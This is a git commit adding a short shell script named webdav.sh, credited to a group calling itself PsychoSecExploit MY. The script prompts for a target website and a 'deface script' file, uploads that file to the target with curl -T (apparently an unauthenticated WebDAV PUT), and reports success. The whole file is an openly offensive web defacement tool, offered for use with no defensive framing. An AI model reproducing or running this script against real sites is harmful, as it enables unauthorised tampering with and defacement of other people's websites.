27a36e821a77ae8d89cfdc7e09b99cfbe673b716
PsychoSecExploitMY <89962932+PsychoSecExploitMY@users.noreply.github.com>
2021-09-02 14:45:51 +0800

    Create webdav.sh

---
+++ webdav.sh
@@ -0,0 +1,12 @@
+clear
+cowsay -f eyes 'WEBDAV
+
+# AUTHOR  : SECRXTH4XOR
+# TEAM    : PSYCHOSECEXPLOIT MY
+# CONTACT : psychosecexploitmy@gmail.com' | lolcat
+
+
+read -p " Website Target ==> " target
+read -p " Nama Script Deface ==> " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [!] Suksess... "
